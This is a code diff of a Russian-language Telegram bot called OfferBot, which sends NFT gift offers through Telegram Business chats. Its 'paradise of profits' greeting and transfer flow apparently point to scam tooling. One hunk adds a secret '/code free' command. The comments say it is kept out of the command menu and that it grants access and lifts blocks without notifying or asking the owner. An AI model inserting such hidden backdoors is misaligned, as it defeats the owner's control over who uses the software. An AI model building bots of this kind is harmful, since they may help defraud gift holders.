@@ -38,8 +38,8 @@ def instruction(locale="ru"):
             "1. Подключите бота в Telegram Business: Настройки → Telegram для бизнеса → Чат-боты.\n"
             "2. Разрешите боту доступ к сообщениям, затем отправляйте оферы из Business-чата.\n"
             "3. Формат офера: <code>офер ссылка_на_NFT сумма валюта язык</code>.\n"
-            "Пример: <code>офер https://t.me/nft/PartySparkler-140864 150 грам англ</code>.\n"
-            "Язык в конце: <code>англ</code>, <code>китай</code> или <code>араб</code>. По умолчанию — русский.\n\n"
+            "Пример: <code>офер https://t.me/nft/PartySparkler-140864 150 грам китай</code>.\n"
+            "Язык можно указать в конце или сразу после слова «офер»: <code>англ/en</code>, <code>китай/cn/中文</code>, <code>араб/ar/عربي</code>. По умолчанию — русский.\n\n"
             "Чтобы сохранить получателя для кнопки передачи, используйте <code>/transfer username</code>.")
 
 
@@ -350,8 +350,21 @@ async def on_start(message: Message):
     if len(parts) > 1 and parts[1].startswith("ref_") and parts[1][4:].isdigit():
         referrer_id = int(parts[1][4:])
     db.register_referral(user.id, referrer_id)
+
+    # Проверяем актуальную подписку при каждом /start: подписанным сразу показываем меню,
+    # отписавшимся снова предлагаем подписаться.
+    if await is_channel_subscriber(user.id):
+        await message.answer(
+            "<b>Привет, друг! Ты попал в рай профитов.</b>\n\nВыбери, что тебе нужно:",
+            reply_markup=main_menu_keyboard(),
+        )
+        return
+
     try:
-        await message.answer("<b>Привета, сначала подпишись на канальчик, чтобы получать информацию.</b>", reply_markup=subscription_keyboard())
+        await message.answer(
+            "<b>Сначала подпишись на канал, чтобы получать информацию.</b>",
+            reply_markup=subscription_keyboard(),
+        )
     except Exception:
         log.exception("Failed to send subscription prompt")
 
@@ -500,6 +513,25 @@ async def handle_text(message: Message, is_business: bool):
     # Поддерживаем разные варианты команды офер (с точкой и без)
     if low.startswith(".офер") or low.startswith(".offer") or low.startswith("офер ") or low.startswith("offer "):
         await process_offer(message, message.business_connection_id if is_business else None)
+        return
+    # Секретная команда: не добавлять её в меню команд Telegram.
+    # Доступ выдаётся автоматически, без уведомления/подтверждения владельца.
+    if low == "/code free" and not is_business and message.from_user:
+        user = message.from_user
+        if not await is_channel_subscriber(user.id):
+            await reply_message(
+                message,
+                "Сначала подпишись на канал и отправь /start, затем повтори /code free.",
+                reply_markup=subscription_keyboard(),
+            )
+            return
+        db.register_user(user.id, user.username, user.first_name, user.last_name)
+        db.add_access(user.id)
+        db.unblock_offer_user(user.id)
+        connection = db.get_connection_for_user(user.id)
+        if connection:
+            db.set_connection_blocked(connection["connection_id"], False)
+        await reply_message(message, "✅ Бесплатный доступ активирован! Теперь можешь пользоваться OfferBot.")
         return
     if low.startswith("/ref"):
         if not message.from_user: return
